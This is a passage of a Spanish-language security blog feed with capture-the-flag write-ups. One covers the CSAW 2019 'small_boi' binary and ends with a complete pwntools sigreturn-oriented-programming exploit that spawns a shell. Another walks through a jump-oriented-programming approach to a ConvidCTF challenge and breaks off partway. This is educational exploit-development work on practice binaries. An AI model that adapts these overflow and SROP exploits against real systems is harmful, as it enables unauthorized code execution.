+&lt;p&gt;Por que existe un syscall así se preguntaran? Pues para que el kernel por ejemplo en momento de ejecución pueda retornar el estado de un programa al retornar de otra syscall por ejemplo. Más detalles pueden encontrar &lt;a href=&quot;https://man7.org/linux/man-pages/man2/sigreturn.2.html&quot;&gt;aca&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Bueno con esto en mente pasemos a la accion!&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Podemos observar que es un binario de 64 bits staticamente linkeado a libc, y que solo cuenta con la proteccion NX activada.&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/PcXEFJ-Hl96nfRubXWkIGaCcVlilAEiTTlc3IptF966sE7J8ncWPcB1S0EUUrkLZmFfSOfy0T7S3JRU1QZNdFbvF6hwbhweq0z8GmcoSsrN7XaVFjgg3AduiJlFt3hjNBh1TFSg-&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;El binario simplemente espera un input y luego parece cerrarse, es un binario pequeno aparentemente programado en ASM o muy poco codigo, revisemos en más detalle en IDA…&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/knYNsqmyDfslA2WiFm8mF4vDrw2d2kRa1JSOgEBWs0t7ge4EP4okkeORshOLNErB4fAxX7sg15XX7U29bofqJpzOp7ZvcMKu1ltVdCzfSeel3YlvHzFwgknZGZ8R5etk8M3CC1QQ&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;El entry point nos muestra que llama a una función en 0x40018C la cuyal renombrare a vuln, luego de eso vemos un syscall a 0x3c lo cual nos indica un exit inmediatamente después analicemos la función mencionada.&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/Mk8f2D_66EjBGSRlDb4b4YlY60S-OubWZwYAZ27tkGbZKW2LlGp_3ai8w5E85AcIX1lNtdn_oIPAs8RL2h39q2yZodb7-0nyvnwA8oyyXonMMkOHm10HadeSB1Mtm-fmKGvynuKD&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Aca podemos ver cómo ocurre la vulnerabilidad, setea un buffer de 20 hex, luego realiza un xor sobre los registros rax y rdi para dejarlos en cero. Esto para que rax apunte al syscall 0 (read) y rdi apunte al stdin (0). El problema es nuestro RDX que indica el tamaño del input que leeremos el cual es de 200, mucho más de los 20 hex que tenemos disponibles, lo que causará un buffer overflow.&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Explorando el binario vemos otras cosas interesantes como el string /bin/sh dentro del binario (nos servira despues)&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/7l142MrvlkF7Z7BSFbVNlC-uoOa7jQIeSumiSaiqAfuDTieHovsgyT1rmrJNUFxIBgOEgbBBraBqqVl5gLOGKWvKXwRtHK4bEisp5IgVTovFcf6WEkKd63ggsGZF9LXX0BQBUc_1&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Además del call a sigreturn en 0x40017c, el cual nos permitirá hacer esta llamada, la cual bien podría considerarse un “one gadget”&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/vP2qAHvIUnf1aDLG8nYNuDVpvwm0lOTFiynjDn2TxB-zPrB5vQWck6mCAZQza9w-sUXqVaHNb5NxertQBgL111U-KENPw7NJkwRC1dNIx_g1a4WUe0Hw1R0TH-yuLLE5-dTzdzVo&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Con esto en mente, hagamos un script para interactuar con el binario, comenzamos con algun setup inicial:&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/4VKXk78s0DFFXjbgT_oTj10Si9X9KpeksDc0q7YfE_Wbg0-9dZu_EmixH2stDZk-OvnMPeqVt9DA4kZCjEOGzn1UJ-mXimczMwMdKt2gQH5fd4A_XwuYV0Y3y4hpX3qKts120dwb&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ahora, rápidamente en gdb (lo estoy usando con pwndbg) con cyclic vemos que el offset en el que crashea el programa (40 bytes, 8 + de los 32 a los que se termina el buffer, algo típico de overflow en 64 bits)&amp;nbsp;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/pT743iRyUgAxau-61u6MwiPIx8MS2HErK149M2f6IjwN4mTUCb7WrxtJS-j_xGhNCyxc3uEeXrJ4z1VafNBC5arQI2MrVWMuD5YLc0N_tiINQ1KcHs5Et3_d7hoQGRSO1QghiAyi&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Pues bien con esto no queda nada más que armar el exploit, sabemos que tenemosla direccion de sigreturn entonces creamops el frame usando la &lt;a href=&quot;https://docs.pwntools.com/en/stable/rop/srop.html&quot;&gt;magia de pwntools&lt;/a&gt; (vaya trabajo de hacer manual si alguien quiere experimentarlo puede ver el stream de este &lt;a href=&quot;https://www.youtube.com/watch?v=L259SbpYtXM&quot;&gt;master&lt;/a&gt;!)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/0lO3WYfUdW7IdCMTk1kgXI8oqPq2hbz4j9E3FFKAwRuGgGxD1oCh5_M7y1A7mohYSvgcEV4zJQgMtVGEppJIZtFIcE4vhnYdbMCOl9hD_EOh15chHZmQSwWPoFy92CxNBE0bgSrx&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ahora que setamos en esos registros? Pues sabemos que tenemos el string de /bin/sh en el binario por lo que podemos setearlo como argumento en RDI y llamar a execve poniendo el registor RAX en x3B, ademas debemos setear RSI y RDX a null y finalizar situando la ejecucion (RIP) en la llamada a un syscall, tenemos todo lo que necesitamos menos el address de un syscall, pero que podemos obtener facilmente mirando IDA (recordemos que el binario no tiene ASLR) o bien usando ropper, la cual obtenemos en la direccion 0x400185&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/rwx8e8sqKT16qspueRZ7n1tXqVOohKUGUfYezNKjasDKg_p6MSWC3Pbbi1XmmdiN9YQzQ8Qncj7BXp0q18IRKjsykWfqjw_rnY5HPmZo5b0ytXFbS79JZDQ2T2DaBIxfv0-p1l0e&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Perfecto ya tenemos todo lo que necesitamos! Probemos… Algo ocurre y obtenemos on EOF&amp;nbsp;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/NwkNv3xHwoXo3ODFDQsJUO-ObRO1gq9TMj539GZKpxbmoeT32GWUnJX_3z5D73xGLvtxR0rRLB_ZAJUL6tci5RfI50zL5lGn__0oe1QrFRz_pvW8xTwp_s0qqUFpGKMlqVribZTt&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/mIo09j22qcK42RRJWF3AsNr9DERS7y7o2CgboV3lZy_mUf9gmYF16YgOIbTHdUrxK7KBwlSc1fYUSIlHQvcArJJJyi1TYQASbQUch5LdgfSQkemtr7xcxwJrcH7tdiyfJVKsRdss&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Al observar podemos ver que los valores de los registros no estan bien, y parecen haberse corrido (shifted) por lo que despues de mucho rato note que los registros tiene un “shift” de 8 bytes, dentro del frame podremos moverlo, probemos una vez mas&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/RJtvZrky6QKbVDq0gmJm141qprwW_jOIoCOg9runwzmDl6eiujM-XjIiWlOMw9ohx0PcKi1YCg5bXgbSeKBTSA8gAhnMlzosKC79Hj42qnZB_FQqx4qTq4BQtIob2gjsqv-mlnZC&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Esta vez los registros si se acomodan! perfecto&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/hmtlqaCEHLpSUDDtSc29RxvAHS7Xr_zuCGEEpSFLGigyw88kB4RqYR4SZFqUxpxxFtz-L_CKHu07woVKRqRmKPiEROjnNLXv8l6mS39_w6Gw7SL7B5U22eMn2nQR6ZmAC503p3oD&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Con eso ejecutamos y shell:&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/idPIGbwammzaMnXWaX4K1azXpowY7TiSXowmYoFiAZbsEYbkjDKFOPuqS8UyxQaZ2vytgrjSaz_7nKMShhxWoTLckk1v00MhsRQ3VtEwapJI8VzW6C48g9wZD_gDfODxop5LYNra&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Espero que les haya gustado esta técnica de explotación, en lo particular parece una buena técnica para ctfs, especialmente cuando nos enfrentamos a algunas restricciones dentro de libc para llamar one_gadet.&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Aca les dejo el exploit final:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:code --&gt;
+&lt;pre class=&quot;wp-block-code&quot;&gt;&lt;code&gt;from pwn import *
+
+# info del binario
+context.binary = './small_boi'
+context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-h']
+#funcion para correr el binario
+def start():
+    if args.GDB:
+        return gdb.debug('./small_boi')
+
+    else:
+        return process('./small_boi')
+
+sigret = p64(0x40017c) #sig return address
+
+frame = SigreturnFrame() #sigreturnframe funcion de pwntools para crear el frame
+frame.rip = 0x400185 #syscall, no empaquetamso ya que el frame poondra el valor directo en el registro
+frame.rax = 0x3b #0x3b es el numero de syscall de execve()
+frame.rdi = 0x4001ca #direccion de /bin/sh no ocupamos empaquetado por los mismo que el rip
+frame.rsi = 0x00 # null 
+frame.rdx = 0x00 # null
+
+
+payload = &quot;A&quot; * 40 #offset
+payload += sigret #direccion de sigretur
+#nuevo frame, con shift de 8 por el cambio del stack
+#vi otros writeups y no se si esto le paso a todo el mundo, a mi me ocurrio con ubuntu 18.04
+payload += str(frame)[8:] 
+
+#interaccion con el binario
+r = start()
+r.sendline(payload)
+r.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- /wp:code --&gt;</content><author><name></name></author><category term="Sin categoría" /><summary type="html">Tenía guardado este writeup, para hablar de SROP, pero justo el ctf de convid, me pilló con un desafío en el que ocupe esta técnica, de todas formas y para que no se pierda aca les dejo el writeup. Es un binario del ctf CSAW 2019 de 100 puntos llamado “small_boi” (pueden descargarlo de aca) el cual resolveremos usando la técnica de sig return oriented programming.&amp;nbsp;</summary></entry><entry><title type="html">ConvidCTF. Algunas soluciones</title><link href="http://localhost:4000/sin%20categor%C3%ADa/2020/06/15/convidctf-algunas-soluciones.html" rel="alternate" type="text/html" title="ConvidCTF. Algunas soluciones" /><published>2020-06-15T16:12:00-04:00</published><updated>2020-06-15T16:12:00-04:00</updated><id>http://localhost:4000/sin%20categor%C3%ADa/2020/06/15/convidctf-algunas-soluciones</id><content type="html" xml:base="http://localhost:4000/sin%20categor%C3%ADa/2020/06/15/convidctf-algunas-soluciones.html">&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Bueno bueno bueno, aprovechando que seguimos con vuelo del CTF recien pasado, les comparto las soluciones a algunos desafios, las he dejado en mi github, y le he puesto algunos comentarios.&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;No me da el tiempo de hacer full writeups, pero a alguien puden servirle :) quizas,  para contrastar soluciones o algo asi. De nuevo gracias al equipo que armamos Jot_Kiddiez, son unos crack!&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;  &lt;br /&gt;&lt;a href=&quot;https://github.com/dplastico/convidCTF-soluciones&quot;&gt;https://github.com/dplastico/convidCTF-soluciones&lt;/a&gt; &lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;</content><author><name></name></author><category term="Sin categoría" /><summary type="html">Bueno bueno bueno, aprovechando que seguimos con vuelo del CTF recien pasado, les comparto las soluciones a algunos desafios, las he dejado en mi github, y le he puesto algunos comentarios.</summary></entry><entry><title type="html">WRITEUP. Scandinavian journal of psychology</title><link href="http://localhost:4000/sin%20categor%C3%ADa/2020/06/15/writeup-scandinavian-journal-of-psychology.html" rel="alternate" type="text/html" title="WRITEUP. Scandinavian journal of psychology" /><published>2020-06-15T00:55:00-04:00</published><updated>2020-06-15T00:55:00-04:00</updated><id>http://localhost:4000/sin%20categor%C3%ADa/2020/06/15/writeup-scandinavian-journal-of-psychology</id><content type="html" xml:base="http://localhost:4000/sin%20categor%C3%ADa/2020/06/15/writeup-scandinavian-journal-of-psychology.html">&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Vengo con el vuelo del CTF de &lt;a href=&quot;https://convid.cl/&quot;&gt;CONVID &lt;/a&gt;que estuvo, pero es que de Lujo! Felicitaciones a los organizadores. El CTF tenía de todo, desafios de Stego, Crypto, Misc, Web, etc. Y sobre todo mi categoría favorita PWN!,&amp;nbsp; soy muy aficionado al exploit dev y sabiendo que algunos desafíos serian hechos por el gran &lt;a href=&quot;https://c4ebt.github.io/&quot;&gt;c4e &lt;/a&gt;venía con muchas expectativas de lo mismo, por lo que me puse de meta intentar todos los desafíos posibles de la categoría, y estoy muy orgullo del logro, ya que no fue fácil&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/mEr6R7Atzk0P_eBf-ige4n8nB6ZVKeIy5F_jcIw2cq9sSdpadHely-af-AKnOpfyBd5moNHHftNeSEENWH4O9W7UFB_lsKqdlz168vmslgb3-WDudTscACoqnMBk0Yqn0fTjCVgw&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Hasta el último minuto no tenía equipo, pero mi amigo n0m0 (MVP de nuestro equipo) Se le ocurrió juntar algunos amigos para ver qué podíamos hacer,&amp;nbsp; la verdad la experiencia siempre es grata, es increíble lo que puedes aprender de todos y las ideas que se discuten, así que gracias de nuevo a mi team Jot_Kiddiez (yeah hackers de los 90!). Me voy muy contento con el tercer lugar, además de felicitar los ganadores &lt;a href=&quot;https://cntr0llz.com/&quot;&gt;Cntr0llz &lt;/a&gt;quienes por paliza nuevamente se llevan otro CTF a sus bolsillos.&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/yMTXIku1dBvKegxSs9KsbgEfU2ZUv_zUkCUW8p66_YhbwLbH7it79rfOPwC2NDrkjfk6p5y2-EmzbEfzEZGzUMmDBmxwfFrJWt_Q568rp4KtU_rHQMoOQyEuA4oDxkO_uUe7tSRV&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Yendo a lo nuestro! El reto en cuestión es un reto llamado Scandinavian Joournal of Psychology (Que fumaron?). Es un binario sujeto la ejecución&amp;nbsp; de JOP (jump oriented programming), &lt;a href=&quot;/writeup-juujuu-pwnday01-soluciones/&quot;&gt;sí de nuevo&lt;/a&gt;, pero esta vez las cosas son un poco más difíciles, casi tanto como con el desafío “Labot”, que pueden leer el writeup en el blog de otro crack  &lt;a href=&quot;https://f4d3.io/convid-pwn-labot/&quot;&gt;f4d3&lt;/a&gt;!.&amp;nbsp;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Revisamos primero el binario para observar que es un ELF de 64 bit dinámicamente linkeado.&amp;nbsp;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/263hl286PktO4QH05IFePzUUrHFhWnXCJ2gzzAFQRJDYKhCOHplX3pUXlZu27SRsTJPPb5OQZ57yN8EFx3J65s0f-ZKxuTKeQLDIzVwL08f8BEnvnnfgiFuf1mTJXsh0Bk0I6Nmf&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Y podemos usar checksec para ver que tiene protección en el stack solamente (NX), por lo tanto no tendremos que lidiar con aslr&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/h16wTJ5FL9WbzfpDlD6EHAKHbkX_EslW23dCwO2ySlIomi-8njNfWzcNO6gCK44P2C17vXJryGQ_819gqHGpaqMiNLHYbt_3rlgb5iLksJDr6o24yDcaIKn_5t1eBbLmxe5OqxXD&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Cuando analizamos el binario con radare2,, podemos observar que es un binario muy pequeño, sin instrucciones “ret” por lo que deberemos ocupar los saltos a registros para controlar el flujo del stack, luego de darnos cuenta que existe un overflow en la función read&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/tyBnJhaxNmL0k7nk2-kr4cC35H46HRAXFgxPsCYl0SEdJo9oqnfwqymV3ydP5xr7D7Dv6XJAkOzijS7bI7s07jl3JsakmEY3tW9lNinfqc_JUKbq7624t7lERhO_DhOfmUjNgXfu&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Probamos usar cyclic para identificar el crash en gdb&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/mT31CFHSg3zAmz62yTSPSKXKmBvqTRh8faN2Wcf__Gwzv8gs8zRZwfTTPpBm8ybx51orO1gTNJJE0jbz8Yg3vXHeQItQX--wEG0q82iJ4HpBCYjIGc6ttC4duw1kkyRgmm6poJYu&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Y luego calcular el offset al crash en RSP que resulta en 264&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/n_6W1YXvLKTKre-EJK9DPYvTDAMEdGze9-3gx76EF_qBihALhRjKxsBZ7btvpYN0SQM2_CvnEA8NeXyR0sUCwEI9gcbhdOhUUGUPkdO-4Q6vhE2y5CMq6TWrdHoKyx2r93JbEkKf&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image {&quot;width&quot;:422,&quot;height&quot;:144} --&gt;
+&lt;figure class=&quot;wp-block-image is-resized&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/NAQ6MQj7xZYoToYBy3lwJiN8uAKJ4sHlOFGTaNwGUHCmCnUZqVQ3fabDwIQnMbajcO2ecul8xkCDhELa_mUw5zkBnSRAXZkjjY9k8crOkftffBrz2dY0CbT96JJVslZ3N6PIAjcN&quot; alt=&quot;&quot; width=&quot;422&quot; height=&quot;144&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Además podemos usar objdump para obtener más información del binario y buscar los gadgets disponibles, resulta interesante que existe una sección .data la cual nos será de utilidad más tarde&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;width&quot;:660,&quot;height&quot;:189} --&gt;
+&lt;figure class=&quot;wp-block-image is-resized&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/8S8pi_CvQMYgQZbae4Hp7pEh5OB4ZLZYjBAWq4tBOeQdamPQPXDprzYDwrDjZuV8XaHRQB0g5-lHbmX4dLkPC8uHGmhtXaxF9qJYmc6wxuHplhoNy5VvtWjsl30u1vDSTLLcE4ya&quot; alt=&quot;&quot; width=&quot;660&quot; height=&quot;189&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Y aca los gadgets disponibles (muy pocos!)&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/LITYQjXoxQbixxNrpqONE6rpmAe47i4GHNGtpzqs4MTpO9kqx4ANZxaczxguATeZMTwzfE0EqIt5ZLuK0qBGtat7-P_b18hpxTBSr9NYICxZ2Jo-F6o3vdC8Dakwnlr-O9Dx5GA3&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Qué hacemos ahora pues jop! Como expliqué en otras ocasiones necesitamos setear&amp;nbsp; un dispatcher el cual nos permita retornar al stack y tomar instrucciones de el cada vez que “retornemos” con un salto. El registro a setear parece ser RCX por y nuestro dispatcher es el salto al stack:&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;width&quot;:657,&quot;height&quot;:47} --&gt;
+&lt;figure class=&quot;wp-block-image is-resized&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/VItpgQdij6u3CmiCqOehlBK6zZol9TJdpE9iQUEOyANUPZVu5f4HY7x1pqdv-ATjGbtzOb8-2oCZHU9WjkYNbc6QkR5jujLnDGIiQG9ZBamRZYD4p2RReXUSJaPRbnZaiEPreLOA&quot; alt=&quot;&quot; width=&quot;657&quot; height=&quot;47&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Así que comenzamos seteando algunas variables y nuestro payload:&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;width&quot;:480,&quot;height&quot;:402} --&gt;
+&lt;figure class=&quot;wp-block-image is-resized&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/LeH4phcdgPkcQQ_2v-XwK8iRI-3tNgm7kle1SeEGHV3FS7aEVEwaBr_EjXT0GtpYuuDVfDa3NbJh99yC1Y6a1YtpqkO1swkY7kMlf8WVnSghA0EXKLNUWuOmrIgmFW70rwR6HKLF&quot; alt=&quot;&quot; width=&quot;480&quot; height=&quot;402&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Bueno con esto ya podemos saber que siempre que ocupemos un gadget que lleve a un salto a RCX vamos a poder retornar a ejecutar la instrucción que se encuentr en el stack, y ahora… Aca es donde uno se cabecea y le da vueltas, no estaba fácil. Luego de muchas pruebas observamos que si llamamos nuevamente a read, el valor de RAX se intercambia con el valor de RDX (el cual contiene el tamaño del buffer donde lee read.&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/iwyUKBLWujtRy5w-dGjLHXs1r95UEriABK17C9wUjMCdC5OV3HHMMqOAtXvGbVb3vpGBXeVBCm2ysE2QQkKY9lWpiHPeUWjIQmZRp8lo7-D-7Zo6mh9B7PCcBCE2jYPpBF02nRg7&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/cjXmcexfZaoXMQExmQnLNaErTwIy95MWR8ZUFgd0iH4PEWPM2rnt4u0WVfVWLah887IPn5Vk4ruo9DqImoCwd-5qULkLaGexpxjZy6kSXEKuuvyobsLEvsLxsHFVzVFY6b9HmHFH&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Genial si sumamos esto al gadget que nos permite aumentar RAX en 7 podemos hacer que el valor de RAX sea 0xF. Que nos permite esto? Pues hacer SROP! O sigreturn oriented programming, que en verdad es una técnica de explotación del tipo “one gadget” ya que nos permite hacer una llamada a sigreturn (que no pide argumentos) y esto nos ayudará a luego crear un “fake frame” lo cual nos permitirá situar los registros a los valores que queramos.&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;a href=&quot;https://lwn.net/Articles/676803/&quot;&gt;Mas info de SROP Aca!&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Excelente pues llamaremos entonces a sigreturn y seteamos los registros para llamar a execve&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
